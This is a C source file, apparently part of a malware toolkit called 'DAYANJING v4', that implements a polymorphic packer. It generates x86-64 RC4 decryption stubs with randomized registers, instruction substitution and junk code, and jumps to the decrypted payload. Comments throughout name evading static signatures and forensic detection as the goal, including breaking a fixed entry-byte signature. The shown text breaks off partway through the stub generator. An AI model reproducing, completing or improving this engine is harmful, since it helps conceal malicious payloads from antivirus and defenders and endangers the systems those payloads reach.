/*
 * DAYANJING v4 — 20_packer / poly.c
 * 多态引擎：x86-64 解码存根生成器。见 include/poly.h。
 */

#include "poly.h"

#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* 返回码文本                                                          */
/* ------------------------------------------------------------------ */

const char *poly_strerror(int rc)
{
    switch (rc) {
    case POLY_OK:           return "ok";
    case POLY_ERR_PARAM:    return "invalid parameter";
    case POLY_ERR_MEM:      return "out of memory";
    case POLY_ERR_TOOBIG:   return "payload too large";
    case POLY_ERR_NOBUILD:  return "no build has been performed";
    default:                return "unknown error";
    }
}

/* ------------------------------------------------------------------ */
/* 随机数：xorshift64，确定性可复现                                     */
/* ------------------------------------------------------------------ */

struct poly_ctx {
    uint64_t  rng;
    uint8_t   key[POLY_KEY_LEN];
    size_t    stub_len;
    size_t    gap_len;
    size_t    ct_off;
    int       have;
    int       abi;
};

static uint64_t xs64(uint64_t *s)
{
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    *s = x;
    return x;
}

static uint32_t rnd(poly_ctx *p, uint32_t n)
{
    return n ? (uint32_t)(xs64(&p->rng) % n) : 0;
}

poly_ctx *poly_new_abi(uint64_t seed, int abi)
{
    if (abi != POLY_ABI_SYSV && abi != POLY_ABI_WIN64) return NULL;
    poly_ctx *p = (poly_ctx *)calloc(1, sizeof(*p));
    if (!p) return NULL;
    /* xorshift64 的状态 0 是不动点：恒输出 0，会让所有变异退化为定值，
       跨构建的区分度归零。种子 0 必须扰动。 */
    p->rng = seed ? seed : 0x9E3779B97F4A7C15ull;
    p->abi = abi;
    return p;
}

poly_ctx *poly_new(uint64_t seed) { return poly_new_abi(seed, POLY_ABI_SYSV); }

int poly_abi(poly_ctx *p) { return p ? p->abi : POLY_ERR_PARAM; }

void poly_free(poly_ctx *p) { free(p); }

/* ------------------------------------------------------------------ */
/* 参考 RC4（与存根逐位等价）                                           */
/* ------------------------------------------------------------------ */

void poly_rc4(const uint8_t key[POLY_KEY_LEN], uint8_t *buf, size_t len)
{
    uint8_t  S[256];
    uint32_t i;
    uint8_t  j = 0;

    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
    for (i = 0; i < 256; i++) {
        j = (uint8_t)(j + S[i] + key[i % POLY_KEY_LEN]);
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }

    i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1u) & 0xFFu;
        j = (uint8_t)(j + S[i]);
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
        buf[n] ^= S[(uint8_t)(S[i] + S[j])];
    }
}

/* ------------------------------------------------------------------ */
/* 字节码发射缓冲                                                       */
/* ------------------------------------------------------------------ */

#define EB_CAP 8192

typedef struct {
    uint8_t b[EB_CAP];
    size_t  n;
} ebuf;

static void eb1(ebuf *e, uint8_t v)
{
    if (e->n < EB_CAP) e->b[e->n++] = v;
}

static void e32(ebuf *e, uint32_t v)
{
    eb1(e, (uint8_t)(v & 0xFFu));
    eb1(e, (uint8_t)((v >> 8) & 0xFFu));
    eb1(e, (uint8_t)((v >> 16) & 0xFFu));
    eb1(e, (uint8_t)((v >> 24) & 0xFFu));
}

static void e64(ebuf *e, uint64_t v)
{
    for (int k = 0; k < 8; k++) eb1(e, (uint8_t)((v >> (8 * k)) & 0xFFu));
}

static void patch32(ebuf *e, size_t off, uint32_t v)
{
    if (off + 4 <= e->n) {
        e->b[off + 0] = (uint8_t)(v & 0xFFu);
        e->b[off + 1] = (uint8_t)((v >> 8) & 0xFFu);
        e->b[off + 2] = (uint8_t)((v >> 16) & 0xFFu);
        e->b[off + 3] = (uint8_t)((v >> 24) & 0xFFu);
    }
}

/* ------------------------------------------------------------------ */
/* x86-64 编码原语                                                     */
/* ------------------------------------------------------------------ */

#define MODRM(mod, reg, rm) ((uint8_t)((((mod) & 3) << 6) | (((reg) & 7) << 3) | ((rm) & 7)))
#define SIB(ss, idx, base)  ((uint8_t)((((ss) & 3) << 6) | (((idx) & 7) << 3) | ((base) & 7)))

/* REX：W=64 位操作数，R/X/B 分别为 reg / index / base 的高位扩展 */
static void emit_rex(ebuf *e, int w, int rr, int xx, int bb)
{
    uint8_t v = (uint8_t)(0x40u | (w ? 8u : 0u) |
                          (rr >= 8 ? 4u : 0u) |
                          (xx >= 8 ? 2u : 0u) |
                          (bb >= 8 ? 1u : 0u));
    if (v != 0x40u) eb1(e, v);
}

/* 8 位操作数版本：reg 落在 4..7（spl/bpl/sil/dil）时也必须发 REX */
static void emit_rex8(ebuf *e, int rr, int xx, int bb)
{
    uint8_t v = (uint8_t)(0x40u | (rr >= 8 ? 4u : 0u) |
                          (xx >= 8 ? 2u : 0u) |
                          (bb >= 8 ? 1u : 0u));
    /*
     * 8 位寄存器落在 reg 字段（rr）时 >=4 需要 REX；落在 rm 字段（bb）时同样
     * 需要——xor r/m8, r8 的两个操作数都是 8 位，只查 rr 会在 dst 为
     * sil/dil/bpl/spl 时退化为 dh/bh/ch/ah，静默写错寄存器。
     * 对内存操作数而言 bb 是 64 位基址，多发的 0x40 是无害的空前缀。
     */
    if (v != 0x40u || rr >= 4 || bb >= 4) eb1(e, v);
}

/* mov r64, imm64 */
static void i_movabs64(ebuf *e, int dst, uint64_t imm)
{
    emit_rex(e, 1, 0, 0, dst);
    eb1(e, (uint8_t)(0xB8u | (dst & 7)));
    e64(e, imm);
}

/* mov r64, r64 */
static void i_mov64_rr(ebuf *e, int dst, int src)
{
    emit_rex(e, 1, src, 0, dst);
    eb1(e, 0x89u);
    eb1(e, MODRM(3, src, dst));
}

/*
 * mov [base + disp8], r64
 * base & 7 == 4（rsp / r12）时 modrm.rm=100 被解释为"SIB 跟随"，必须补 SIB。
 * rsp 不在分配池内，但 r12 在——漏掉这一条会让所有以 r12 为基址的访存
 * 编码错位，且错位后仍是一条合法指令，只会在运行时崩，编译期与静态审查
 * 都发现不了。
 */
static void i_mov64_mr_d8(ebuf *e, int base, int disp, int src)
{
    emit_rex(e, 1, src, 0, base);
    eb1(e, 0x89u);
    eb1(e, MODRM(1, src, base));
    if ((base & 7) == 4) eb1(e, 0x24u);
    eb1(e, (uint8_t)disp);
}

/* mov r64, [base + disp8] */
static void i_mov64_rm_d8(ebuf *e, int dst, int base, int disp)
{
    emit_rex(e, 1, dst, 0, base);
    eb1(e, 0x8Bu);
    eb1(e, MODRM(1, dst, base));
    if ((base & 7) == 4) eb1(e, 0x24u);
    eb1(e, (uint8_t)disp);
}

/* lea r64, [rsp + disp32] */
static void i_lea_rsp(ebuf *e, int dst, int32_t disp)
{
    emit_rex(e, 1, dst, 0, 4);
    eb1(e, 0x8Du);
    eb1(e, MODRM(2, dst, 4));
    eb1(e, 0x24u);
    e32(e, (uint32_t)disp);
}

/* lea r64, [base + disp32]（同样需要 r12 的 SIB 兜底） */
static void i_lea_rm32(ebuf *e, int dst, int base, int32_t disp)
{
    emit_rex(e, 1, dst, 0, base);
    eb1(e, 0x8Du);
    eb1(e, MODRM(2, dst, base));
    if ((base & 7) == 4) eb1(e, 0x24u);
    e32(e, (uint32_t)disp);
}

/* add/sub rsp, imm32 （ext: 0=add, 5=sub） */
static void i_op_rsp_i32(ebuf *e, int ext, int32_t imm)
{
    emit_rex(e, 1, 0, 0, 4);
    eb1(e, 0x81u);
    eb1(e, MODRM(3, ext, 4));
    e32(e, (uint32_t)imm);
}

/* 32 位寄存器-寄存器运算（op: 0x01 add, 0x31 xor, 0x29 sub） */
static void i_op32_rr(ebuf *e, uint8_t op, int dst, int src)
{
    emit_rex(e, 0, src, 0, dst);
    eb1(e, op);
    eb1(e, MODRM(3, src, dst));
}

/*
 * 64 位寄存器与 imm32 运算（ext: 0 add, 5 sub）。
 * 指针计算必须用 64 位形式：写 32 位寄存器会把高 32 位清零，
 * 地址被截成 32 位立即数，跳转后必然落在一个不可读的地址上。
 * 这条踩过一次——objdump 显示 add $0x13e,%r8d，而存根需要的是 add $0x13e,%r8。
 */
static void i_op64_ri32(ebuf *e, int ext, int dst, uint32_t imm)
{
    emit_rex(e, 1, 0, 0, dst);
    eb1(e, 0x81u);
    eb1(e, MODRM(3, ext, dst));
    e32(e, imm);
}

/* 32 位寄存器与 imm32 运算（ext: 0 add, 4 and, 5 sub, 7 cmp） */
static void i_op32_ri32(ebuf *e, int ext, int dst, uint32_t imm)
{
    emit_rex(e, 0, 0, 0, dst);
    eb1(e, 0x81u);
    eb1(e, MODRM(3, ext, dst));
    e32(e, imm);
}

/* 32 位寄存器与 imm8 运算 */
static void i_op32_ri8(ebuf *e, int ext, int dst, uint8_t imm)
{
    emit_rex(e, 0, 0, 0, dst);
    eb1(e, 0x83u);
    eb1(e, MODRM(3, ext, dst));
    eb1(e, imm);
}

/* inc r32 */
static void i_inc32(ebuf *e, int reg)
{
    emit_rex(e, 0, 0, 0, reg);
    eb1(e, 0xFFu);
    eb1(e, MODRM(3, 0, reg));
}

/*
 * [base + index] 的三处发射共用同一条避险规则：
 *   SIB.base == 101 且 mod == 00 时，x86-64 将其解释为"无基址 + disp32"，
 *   REX.B 也不生效。因此 base & 7 == 5（rbp / r13）必须改用 mod=01 + disp8=0。
 *   漏掉这条时指令依然是合法的——只是凭空多出一个 4 字节 disp32，把后面的
 *   字节吃进地址里，表现为运行期访问一个荒谬地址，编译与静态审查都发现不了。
 *   （base & 7 == 4 即 rsp/r12 无此问题：SIB.base=100 在 mod=00 下就是 rsp。）
 */
/* movzx r64, byte [base + index] */
static void i_movzx8_m(ebuf *e, int dst, int base, int idx)
{
    emit_rex(e, 1, dst, idx, base);
    eb1(e, 0x0Fu); eb1(e, 0xB6u);
    int mod = ((base & 7) == 5) ? 1 : 0;
    eb1(e, MODRM(mod, dst, 4));
    eb1(e, SIB(0, idx, base));
    if (mod == 1) eb1(e, 0x00u);
}

/* movzx r64, 自身低 8 位（等价于 and r64, 255，且不影响标志位） */
static void i_movzx8_self(ebuf *e, int reg)
{
    emit_rex(e, 1, reg, 0, reg);
    eb1(e, 0x0Fu); eb1(e, 0xB6u);
    eb1(e, MODRM(3, reg, reg));
}

/* mov dst8, byte [base + index] */
static void i_mov8_rm(ebuf *e, int dst, int base, int idx)
{
    emit_rex8(e, dst, idx, base);
    eb1(e, 0x8Au);
    int mod = ((base & 7) == 5) ? 1 : 0;
    eb1(e, MODRM(mod, dst, 4));
    eb1(e, SIB(0, idx, base));
    if (mod == 1) eb1(e, 0x00u);
}

/* mov byte [base + index], src8 */
static void i_mov8_mr(ebuf *e, int base, int idx, int src)
{
    emit_rex8(e, src, idx, base);
    eb1(e, 0x88u);
    int mod = ((base & 7) == 5) ? 1 : 0;
    eb1(e, MODRM(mod, src, 4));
    eb1(e, SIB(0, idx, base));
    if (mod == 1) eb1(e, 0x00u);
}

/* xor r/m8, r8 */
static void i_xor8_rr(ebuf *e, int dst, int src)
{
    emit_rex8(e, src, 0, dst);
    eb1(e, 0x30u);
    eb1(e, MODRM(3, src, dst));
}

/* call rel32（占位，稍后回填） */
static void i_call32(ebuf *e, uint32_t rel)
{
    eb1(e, 0xE8u);
    e32(e, rel);
}

/*
 * lea r64, [rip + disp32] —— 7 字节，位置无关取 RIP。
 * 与 call/pop 等价，但字节模式完全不同（48/4C 8D modrm disp32），
 * 用于打散入口处恒定出现的 E8 00 00 00 00 五字节签名。
 */
static void i_lea_rip(ebuf *e, int dst, int32_t disp)
{
    /*
     * dst 落在 ModRM 的 reg 字段（不是 rm），因此 r8..r15 要靠 REX.R 选择，
     * 必须传在 rr 位。曾误传在 bb 位：发出的是 REX.B，r9 被编码成 rcx，
     * RIP 写进了错误的寄存器，末尾 jmp *rP 直接飞掉（实测 200 份里约一半
     * SIGSEGV）。rm=101 是 RIP 相对寻址，不需要 REX.B。
     */
    emit_rex(e, 1, dst, 0, 0);                      /* REX.W (+R if r8..r15) */
    eb1(e, 0x8Du);
    eb1(e, (uint8_t)(0x05u | ((dst & 7) << 3)));    /* mod=00 reg=dst rm=101 */
    e32(e, (uint32_t)disp);
}

/* 多字节 NOP：仅用于入口前缀，不触碰任何寄存器与标志位 */
static const uint8_t NOPS[5][5] = {
    { 0x90, 0x00, 0x00, 0x00, 0x00 },   /* 1 */
    { 0x66, 0x90, 0x00, 0x00, 0x00 },   /* 2 */
    { 0x0F, 0x1F, 0x00, 0x00, 0x00 },   /* 3 */
    { 0x0F, 0x1F, 0x40, 0x00, 0x00 },   /* 4 */
    { 0x0F, 0x1F, 0x44, 0x00, 0x00 }    /* 5 */
};
static const uint8_t NOPLEN[5] = { 1, 2, 3, 4, 5 };

/* pop r64 */
static void i_pop64(ebuf *e, int reg)
{
    emit_rex(e, 0, 0, 0, reg);
    eb1(e, (uint8_t)(0x58u | (reg & 7)));
}

/* jcc rel32（占位）；cc: 0x85 jne, 0x82 jb, 0x86 jbe, 0x84 je */
static size_t i_jcc32(ebuf *e, uint8_t cc)
{
    size_t off = e->n;
    eb1(e, 0x0Fu);
    eb1(e, cc);
    e32(e, 0);
    return off;
}

/* 回填 jcc rel32：rel = target - insn_end */
static void patch_jcc32(ebuf *e, size_t off, size_t target)
{
    size_t end = off + 6;
    patch32(e, off + 2, (uint32_t)((int64_t)target - (int64_t)end));
}

/* jmp r64 */
static void i_jmp64(ebuf *e, int reg)
{
    emit_rex(e, 0, 0, 0, reg);
    eb1(e, 0xFFu);
    eb1(e, MODRM(3, 4, reg));
}

/* bswap r64 / not r64（均不影响标志位） */
static void i_bswap64(ebuf *e, int reg)
{
    emit_rex(e, 1, 0, 0, reg);
    eb1(e, 0x0Fu);
    eb1(e, (uint8_t)(0xC8u | (reg & 7)));
}

static void i_not64(ebuf *e, int reg)
{
    emit_rex(e, 1, 0, 0, reg);
    eb1(e, 0xF7u);
    eb1(e, MODRM(3, 2, reg));
}

/* xchg r64, r64（同一寄存器：语义为空操作，不影响标志位） */
static void i_xchg_self(ebuf *e, int reg)
{
    emit_rex(e, 1, reg, 0, reg);
    eb1(e, 0x87u);
    eb1(e, MODRM(3, reg, reg));
}

/*
 * 被调用者保存（非易失）寄存器。存根会被"当作函数调用"，宿主完全有理由
 * 认为这些寄存器在返回后保持不变。存根把它们当普通分配单元用掉而不保存，
 * 单次调用看不出问题（宿主恰好没用到），第二次调用就崩——这正是本模块踩到
 * 的坑：单元测试连跑 64 份制品时在第 2 次迭代段错误。
 * rbp(5) 不参与分配，故不在此列。
 *
 * 两套集合的唯一差别是 RSI(6)/RDI(7)：SysV 视其为易失，MS x64 视其为非易失。
 * 这是"Windows 版存根"与"Linux 版存根"在机器码层面唯一必需的区别——指令集
 * 完全相同，差别只在"必须保存哪些寄存器"以及随之而来的保存槽数量。
 */
static const int CALLEE_SAVED_SYSV[5]  = { 3, 12, 13, 14, 15 };
static const int CALLEE_SAVED_WIN64[7] = { 3, 6, 7, 12, 13, 14, 15 };

/* 保存槽上限：决定栈帧底部预留多少字节，密钥区必须排在它之后 */
#define NSAVE_MAX_SYSV   5
#define NSAVE_MAX_WIN64  7

/* ------------------------------------------------------------------ */
/* 寄存器分配                                                          */
/* ------------------------------------------------------------------ */

/*
 * 可用寄存器池：排除 rsp(4) 与 rbp(5)。
 *   - rsp 作为 SIB base 时 mod=00 被解释为"无基址"
 *   - rbp 作为 modrm rm 且 mod=00 时同样被解释为"disp32 无基址"
 * 两者都会让 [base+index] 编码失效，故一律不参与分配。
 */
static const int POOL[14] = { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };

/*
 * SysV ABI 的易失（调用者保存）寄存器。rB 与 rP 必须取自这里：
 *   - rB 由 call/pop 取得，发生在保存动作之前，其原值已无从恢复
 *   - rP 必须活到最后的 jmp，若它是被调用者保存寄存器，收尾时的恢复会把
 *     载荷指针覆盖成宿主的旧值，jmp 直接飞掉
 * 这两条都是实测踩出来的：恢复插入后 300 个种子里 113 个崩，崩点全是 jmp。
 */
static int is_volatile_sysv(int x)
{
    return x == 0 || x == 1 || x == 2 ||   /* rax rcx rdx */
           x == 6 || x == 7 ||             /* rsi rdi（SysV 下易失） */
           x == 8 || x == 9 || x == 10 || x == 11;  /* r8..r11 */
}

/*
 * MS x64：易失集合不含 rsi/rdi。
 * rB 与 rP 必须取自易失集合：
 *   - rB 由 call/pop 取得，发生在保存动作之前，其原值已无从恢复
 *   - rP 必须活到最后的 jmp，若它是被调用者保存寄存器，收尾时的恢复会把
 *     载荷指针覆盖成宿主的旧值，jmp 直接飞掉
 * 这两条都是实测踩出来的：恢复插入后 300 个种子里 113 个崩，崩点全是 jmp。
 * Win64 下易失池只剩 7 个（rax rcx rdx r8..r11），仍远多于所需的 2 个。
 */
static int is_volatile_win64(int x)
{
    return x == 0 || x == 1 || x == 2 ||   /* rax rcx rdx */
           x == 8 || x == 9 || x == 10 || x == 11;  /* r8..r11 */
}

static int is_volatile_abi(int x, int abi)
{
    return abi == POLY_ABI_WIN64 ? is_volatile_win64(x) : is_volatile_sysv(x);
}

typedef struct {
    int rB;     /* 存根自身 RIP（call/pop 取得）—— 必须易失 */
    int rS;     /* S 盒基址 */
    int rK;     /* 密钥基址 */
    int rI;     /* i */
    int rJ;     /* j */
    int rWi;    /* 密钥下标 i % 16 */
    int rP;     /* 载荷指针 —— 必须易失（要活到 jmp） */
    int rL;     /* 载荷偏移（同时复用为 S 盒初始化计数器） */
    int rT;     /* 临时 A（同时复用为密钥低 8 字节） */
    int rT2;    /* 临时 B（同时复用为密钥高 8 字节） */
    int rA;     /* 字节暂存 A */
    int rB2;    /* 字节暂存 B */
    int rJunk;  /* 垃圾指令专用 */
} regs;

/* 从池中取出第一个满足条件的寄存器并将其移除 */
static int take_if(int *pool, int *n, int abi)
{
    for (int k = 0; k < *n; k++) {
        if (is_volatile_abi(pool[k], abi)) {
            int v = pool[k];
            for (int q = k; q < *n - 1; q++) pool[q] = pool[q + 1];
            (*n)--;
            return v;
        }
    }
    return pool[--(*n)];   /* 理论上不会走到：易失寄存器最少 7 个，只需 2 个 */
}

static void alloc_regs(poly_ctx *p, regs *r)
{
    int pool[14];
    for (int k = 0; k < 14; k++) pool[k] = POOL[k];
    /* Fisher-Yates，用引擎自身的 rng，保证同一种子可复现 */
    for (int k = 13; k > 0; k--) {
        uint32_t q = rnd(p, (uint32_t)(k + 1));
        int t = pool[k]; pool[k] = pool[q]; pool[q] = t;
    }
    int n = 14;
    r->rB    = take_if(pool, &n, p->abi);
    r->rP    = take_if(pool, &n, p->abi);
    r->rS    = pool[0];
    r->rK    = pool[1];
    r->rI    = pool[2];
    r->rJ    = pool[3];
    r->rWi   = pool[4];
    r->rL    = pool[5];
    r->rT    = pool[6];
    r->rT2   = pool[7];
    r->rA    = pool[8];
    r->rB2   = pool[9];
    r->rJunk = pool[10];
}

/* ------------------------------------------------------------------ */
/* 等价指令变异原语                                                     */
/* ------------------------------------------------------------------ */

/* 置零：xor / sub / mov r32,0 / and r32,0 */
static void m_zero(poly_ctx *p, ebuf *e, int reg)
{
    switch (rnd(p, 4)) {
    case 0: i_op32_rr(e, 0x31u, reg, reg); break;              /* xor r,r */
    case 1: i_op32_rr(e, 0x29u, reg, reg); break;              /* sub r,r */
    case 2: emit_rex(e, 0, 0, 0, reg);
            eb1(e, (uint8_t)(0xB8u | (reg & 7))); e32(e, 0); break; /* mov r32,0 */
    default: i_op32_ri32(e, 4, reg, 0); break;                 /* and r,0 */
    }
}

/* 自增：inc / add imm8 / add imm32 */
static void m_inc(poly_ctx *p, ebuf *e, int reg)
{
    switch (rnd(p, 3)) {
    case 0: i_inc32(e, reg); break;
    case 1: i_op32_ri8(e, 0, reg, 1); break;
    default: i_op32_ri32(e, 0, reg, 1u); break;
    }
}

/* 取模 256：and imm32 / movzx 自身低 8 位 */
static void m_mod256(poly_ctx *p, ebuf *e, int reg)
{
    if (rnd(p, 2)) i_op32_ri32(e, 4, reg, 255u);
    else           i_movzx8_self(e, reg);
}

/* 零扩展加载一字节：movzx r64,m8 / (xor + mov r8,m8) */
static void m_load8(poly_ctx *p, ebuf *e, int dst, int base, int idx)
{
    if (rnd(p, 2)) {
        i_movzx8_m(e, dst, base, idx);
    } else {
        m_zero(p, e, dst);
        i_mov8_rm(e, dst, base, idx);
    }
}

/*
 * 垃圾指令：全部不影响标志位，因此可以插在任意两条指令之间而不必分析
 * 标志位活跃性。这一点是本模块能安全做随机插入的前提——若引入 add/or/
 * neg 之类会影响标志位的指令，就必须维护完整的标志位活跃区间，否则会
 * 破坏紧随其后的条件跳转。
 */
static void m_junk(poly_ctx *p, ebuf *e, int junk)
{
    switch (rnd(p, 9)) {
    case 0: eb1(e, 0x90u); break;                                  /* nop */
    case 1: i_xchg_self(e, junk); break;                           /* xchg r,r */
    case 2: i_lea_rm32(e, junk, junk,
                       (int32_t)(rnd(p, 0x10000u) + 1u)); break;   /* lea r,[r+d] */
    case 3: i_movabs64(e, junk, xs64(&p->rng)); break;             /* movabs */
    case 4: i_bswap64(e, junk); break;                             /* bswap */
    case 5: i_not64(e, junk); break;                               /* not */
    /* 原第 6 项是 push/pop：push 一定写在当前 rsp 之下，而"当前 rsp"在分配
       帧之后仍是帧底之下，等于写宿主的 red zone。且它在保存动作之前出现时
       还会毁掉待保存寄存器的原值。故改为 66 90 前缀空操作。 */
    case 6: eb1(e, 0x66u); eb1(e, 0x90u); break;                  /* xchg ax,ax */
    case 7: i_mov64_rr(e, junk, junk); break;                      /* mov r,r */
    default: /* 多字节 nop：0f 1f 44 00 00 */
        eb1(e, 0x0Fu); eb1(e, 0x1Fu); eb1(e, 0x44u);
        eb1(e, 0x00u); eb1(e, 0x00u);
        break;
    }
}

static void m_junks(poly_ctx *p, ebuf *e, int junk)
{
    uint32_t n = rnd(p, 4);   /* 0..3 条 */
    for (uint32_t k = 0; k < n; k++) m_junk(p, e, junk);
}

/* ------------------------------------------------------------------ */
/* 存根生成                                                            */
/* ------------------------------------------------------------------ */

static int gen_stub(poly_ctx *p, ebuf *e, size_t pay_len, size_t gap)
{
    regs r;
    alloc_regs(p, &r);

    /*
     * 栈帧布局（自低地址向高地址）：
     *   [0 .. nsave_max*8)  被调用者保存寄存器槽位（最多 5 或 7 个）
     *   [koff ..)           密钥 16 字节
     *   [soff ..)           S 盒 256 字节
     * 保存槽必须在最底部：密钥与 S 盒的偏移都从帧底起算，若槽位与之重叠，
     * 解密前寄存器就被密文覆盖。Win64 比 SysV 多两个非易失寄存器（rsi/rdi），
     * 槽位上限从 5 变 7，密钥区起始必须随之后移——写死 48 会让第 6、7 个槽
     * 压在密钥上，且不会报错，只是静默解出错误明文。
     */
    int nsave_max = (p->abi == POLY_ABI_WIN64) ? NSAVE_MAX_WIN64 : NSAVE_MAX_SYSV;
    const int *csp = (p->abi == POLY_ABI_WIN64) ? CALLEE_SAVED_WIN64 : CALLEE_SAVED_SYSV;

    uint32_t koff = (uint32_t)(nsave_max * 8 + 8) + 8u * rnd(p, 7u);
    uint32_t soff = (koff + 16u) + 8u * rnd(p, 9u);
    uint32_t frame = ((soff + 256u) + 15u) & ~15u;

    /* 收集本次真正用到的被调用者保存寄存器 */
    const int allr[13] = { r.rB, r.rS, r.rK, r.rI, r.rJ, r.rWi, r.rP,
                           r.rL, r.rT, r.rT2, r.rA, r.rB2, r.rJunk };
    int save[NSAVE_MAX_WIN64]; int ns = 0;
    for (int t = 0; t < nsave_max; t++) {
        int c = csp[t];
        for (int q = 0; q < 13; q++)
            if (allr[q] == c) { save[ns++] = c; break; }
    }
    uint32_t slot[NSAVE_MAX_WIN64];
    for (int t = 0; t < NSAVE_MAX_WIN64; t++) slot[t] = 8u * (uint32_t)t;
    for (int t = ns - 1; t > 0; t--) {          /* 槽位顺序随机化 */
        uint32_t q = rnd(p, (uint32_t)(t + 1));
        uint32_t tmp = slot[t]; slot[t] = slot[q]; slot[q] = tmp;
    }

    uint64_t klo = 0, khi = 0;
    for (int k = 0; k < 8; k++) {
        klo |= (uint64_t)p->key[k] << (8 * k);
        khi |= (uint64_t)p->key[8 + k] << (8 * k);
    }

    /*
     * --- 取自身 RIP ---
     *
     * 两种等价实现随机选，外加 0..2 条多字节 NOP 前缀。
     *
     * 只用 call/pop 时，每一份制品的前 5 字节恒为 E8 00 00 00 00 —— 这是一条
     * 可直接匹配入口的静态签名（实测 200 份构建的最长固定字节游程 = 5）。
     * 它是逐字节统计 distinct 值的取证程序才发现的；只查"16 字节公共串"
     * 的测试永远看不见。故引入 lea 变体，并把入口位置本身也随机化。
     *
     * 此处不能插 m_junks：被调用者保存寄存器还没入槽，垃圾指令若写到一个
     * 待保存的寄存器上，其宿主原值就被永久毁掉，恢复回去的是垃圾。所以前缀
     * 只能用不触碰任何寄存器的多字节 NOP。
     */
    size_t P = 0;                       /* 取 RIP 指令在存根内的起始偏移 */
    int npad = (int)rnd(p, 3);          /* 0..2 */
    for (int t = 0; t < npad; t++) {
        int k = (int)rnd(p, 5);
        for (int q = 0; q < NOPLEN[k]; q++) eb1(e, NOPS[k][q]);
        P += NOPLEN[k];
    }

    size_t rip_off;                     /* rB 最终指向的存根内偏移 */
    if (rnd(p, 2)) {
        /* 变体 A：call +0 / pop rB —— 6 字节，rB = base + P + 5 */
        i_call32(e, 0);
        i_pop64(e, r.rB);
        rip_off = P + 5u;
    } else {
        /*
         * 变体 B：lea rB, [rip + d] —— 7 字节。
         * ro 随机化 → disp32 = ro - (P+7) 随机 → 该指令后 4 字节逐构建不同，
         * 不会退化成又一条新的固定签名。
         */
        uint32_t ro = 8u + rnd(p, 40u);
        i_lea_rip(e, r.rB, (int32_t)ro - (int32_t)(P + 7u));
        rip_off = ro;
    }

    /* --- 栈帧 --- */
    i_op_rsp_i32(e, 5, (int32_t)frame);   /* sub rsp, frame */
    for (int t = 0; t < ns; t++)
        i_mov64_mr_d8(e, 4, (int)slot[t], save[t]);   /* 保存到帧底槽位 */
    m_junks(p, e, r.rJunk);

    /* --- S 盒基址 --- */
    i_lea_rsp(e, r.rS, (int32_t)soff);
    m_junks(p, e, r.rJunk);

    /* --- 密钥：两条 movabs 内联进代码 --- */
    i_movabs64(e, r.rT, klo);
    i_movabs64(e, r.rT2, khi);
    i_lea_rsp(e, r.rK, (int32_t)koff);
    i_mov64_mr_d8(e, r.rK, 0, r.rT);
    i_mov64_mr_d8(e, r.rK, 8, r.rT2);
    m_junks(p, e, r.rJunk);

    /* --- 载荷指针：rP = rB + delta（7 字节，末尾回填） --- */
    i_mov64_rr(e, r.rP, r.rB);
    size_t poff = e->n;
    uint32_t variant = rnd(p, 3);
    switch (variant) {
    case 0: i_op64_ri32(e, 0, r.rP, 0); break;                 /* add rP, d */
    case 1: i_lea_rm32(e, r.rP, r.rP, 0); break;               /* lea rP,[rP+d] */
    default: i_op64_ri32(e, 5, r.rP, 0); break;                /* sub rP, -d */
    }
    /* 三种变体的立即数/位移都落在最后 4 字节，但 REX 是否出现会影响总长，
       因此必须按实际发射位置记录，不能按固定偏移猜。 */
    size_t delta_imm = e->n - 4u;

    /* --- 载荷长度 --- */
    if (rnd(p, 2)) {
        emit_rex(e, 0, 0, 0, r.rL);
        eb1(e, (uint8_t)(0xB8u | (r.rL & 7)));
        e32(e, (uint32_t)pay_len);
    } else {
        i_movabs64(e, r.rL, (uint64_t)pay_len);
    }
    m_junks(p, e, r.rJunk);

    /* --- S 盒初始化：S[x] = x --- */
    m_zero(p, e, r.rL);
    size_t init_top = e->n;
    i_mov8_mr(e, r.rS, r.rL, r.rL);
    m_inc(p, e, r.rL);
    i_op32_ri32(e, 7, r.rL, 256u);
    size_t j_init = i_jcc32(e, rnd(p, 2) ? 0x85u : 0x82u);   /* jne / jb */
    patch_jcc32(e, j_init, init_top);
    m_junks(p, e, r.rJunk);

    /* --- KSA --- */
    m_zero(p, e, r.rI);
    m_zero(p, e, r.rJ);
    m_zero(p, e, r.rWi);
    size_t ksa_top = e->n;
    m_load8(p, e, r.rT, r.rS, r.rI);              /* t = S[i] */
    i_op32_rr(e, 0x01u, r.rJ, r.rT);              /* j += S[i] */
    m_load8(p, e, r.rT2, r.rK, r.rWi);            /* key[i%16] */
    i_op32_rr(e, 0x01u, r.rJ, r.rT2);
    m_mod256(p, e, r.rJ);
    i_mov8_rm(e, r.rA, r.rS, r.rI);               /* swap */
    i_mov8_rm(e, r.rB2, r.rS, r.rJ);
    i_mov8_mr(e, r.rS, r.rI, r.rB2);
    i_mov8_mr(e, r.rS, r.rJ, r.rA);
    m_inc(p, e, r.rI);
    m_inc(p, e, r.rWi);
    i_op32_ri32(e, 7, r.rWi, 16u);
    size_t j_wi = i_jcc32(e, 0x85u);              /* jne 跳过归零 */
    m_zero(p, e, r.rWi);
    patch_jcc32(e, j_wi, e->n);
    i_op32_ri32(e, 7, r.rI, 256u);
    size_t j_ksa = i_jcc32(e, rnd(p, 2) ? 0x85u : 0x82u);
    patch_jcc32(e, j_ksa, ksa_top);
    m_junks(p, e, r.rJunk);

    /* --- PRGA --- */
    m_zero(p, e, r.rI);
    m_zero(p, e, r.rJ);
    m_zero(p, e, r.rL);
    size_t prga_top = e->n;
    m_inc(p, e, r.rI);
    m_mod256(p, e, r.rI);
    m_load8(p, e, r.rT, r.rS, r.rI);
    i_op32_rr(e, 0x01u, r.rJ, r.rT);
    m_mod256(p, e, r.rJ);
    i_mov8_rm(e, r.rA, r.rS, r.rI);
    i_mov8_rm(e, r.rB2, r.rS, r.rJ);
    i_mov8_mr(e, r.rS, r.rI, r.rB2);
    i_mov8_mr(e, r.rS, r.rJ, r.rA);
    m_load8(p, e, r.rT, r.rS, r.rI);
    m_load8(p, e, r.rT2, r.rS, r.rJ);
    i_op32_rr(e, 0x01u, r.rT, r.rT2);
    m_mod256(p, e, r.rT);
    i_mov8_rm(e, r.rA, r.rS, r.rT);               /* k = S[t] */
